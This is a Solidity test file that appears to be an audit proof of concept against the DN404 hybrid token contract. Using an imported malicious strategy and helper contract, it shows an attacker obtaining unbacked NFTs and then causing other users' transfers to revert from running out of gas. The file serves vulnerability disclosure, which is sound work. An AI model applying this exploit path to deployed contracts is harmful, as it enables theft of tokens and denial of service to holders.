// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import {SoladyTest} from "../../utils/SoladyTest.sol";
import {PocDN404} from "./PocDN404.sol";
import {MaliciousStrategy, SecondaryHelper} from "./MaliciousStrategy.sol";
import {DN404Mirror} from "../../../src/DN404Mirror.sol";

contract PocMintTests is SoladyTest {

    PocDN404 dn;
    DN404Mirror mirror;
    MaliciousStrategy maliciousStrategy;
    SecondaryHelper helper;

    function setUp() public {
        dn = new PocDN404("DN-POC", "DN-POC");
        mirror = new DN404Mirror(address(this));
        dn.initializeDN404(0, address(0), address(mirror));
        maliciousStrategy = new MaliciousStrategy(dn);
        dn.enableStrategy(address(maliciousStrategy));
        helper = new SecondaryHelper(maliciousStrategy);
        maliciousStrategy.setHelper(helper);
    }

    function test_poc_double_nfts() public {

        // setup
        address alice = address(uint160(uint256(keccak256(abi.encode(1)))));
        address bob = address(maliciousStrategy);
        address eve = address(uint160(uint256(keccak256(abi.encode(2)))));
        address randomUser = address(uint160(uint256(keccak256(abi.encode(3)))));

        uint256 amount = 1e18; // have 1 NFTs
        uint256 initialBobNFTCount = 3;
        uint256 initialHelperNFTCount = 2;

        // setup the NFTs for bob and the helper
        dn.mint(bob, initialBobNFTCount * amount);        
        dn.mint(address(helper), initialHelperNFTCount * amount);
        
        assertEq(initialBobNFTCount, mirror.balanceOf(bob));
        assertEq(initialHelperNFTCount, mirror.balanceOf(address(helper)));

        // mark in the helper what NFT IDs it has; an attacker may set these in whatever means he wishes
        helper.setIds(4);
        helper.setIds(5);
        
        // save the totalSupply before the exploit
        uint256 totalBefore = mirror.totalSupply();

        // show that 5 is the maximum number of total NFTs that can exist given the DN404 total supply and unit amount
        assertEq(dn.totalSupply()/dn.unit(), mirror.totalSupply());
        assertEq(totalBefore, 5);

        // initiate the exploit transaction, we are transferring all of bob's NFTs but can also work with less
        vm.prank(bob);
        dn.transfer(alice, initialBobNFTCount * amount);        

        // show that both bob and the helper show a balance of 0 NFTs
        assertEq(mirror.balanceOf(bob), 0);
        assertEq(mirror.balanceOf(address(helper)), 0);

        // show that no NFTs were lost during the exploit and that there are still only 5 maximum that can exist on the 
        // existing DN404 amounts
        assertEq(totalBefore, mirror.totalSupply());
        assertEq(mirror.totalSupply(), 5);
        assertEq(dn.totalSupply()/dn.unit(), mirror.totalSupply());

        // create more base tokens that do not generate NFTs so that IDs become available
        // send it to EVE
        vm.prank(eve);
        dn.setSkipNFT(true);
        dn.mint(eve, 2*amount);
        
        // if we would of run this without the above mint, it would revert in finding a free tokenId with OOG
        // transfer an arbitrary amount to bob just to trigger the minting of the extra NFTs, triggering the exploit
        vm.prank(bob);
        dn.transfer(bob, 0);

        // ======================== showing extra NFTs ========================

        // show that now, according to the mirror ERC721 bob has 2 NFTs
        assertEq(mirror.balanceOf(bob), 2);

        // and has enough DN404 base tokens only for 2 NFTs
        assertEq(dn.balanceOf(bob)/dn.unit(), 2);

        // but bob actually has ownership of 4 NFTs
        assertEq(bob, mirror.ownerOf(4));
        assertEq(bob, mirror.ownerOf(5));
        assertEq(bob, mirror.ownerOf(6));
        assertEq(bob, mirror.ownerOf(7));

        // ======================== showing DOS ========================

        // since we already have maxed out the number of NFTs
        assertEq(dn.totalSupply()/dn.unit(), mirror.totalSupply());

        // users that had base tokens but no corresponding NFT to that amount, which now trigger mints through operations
        // will OOG, DOSing 
        vm.prank(eve);
        vm.expectRevert(bytes(""));
        dn.transfer(randomUser, amount);
    }
}
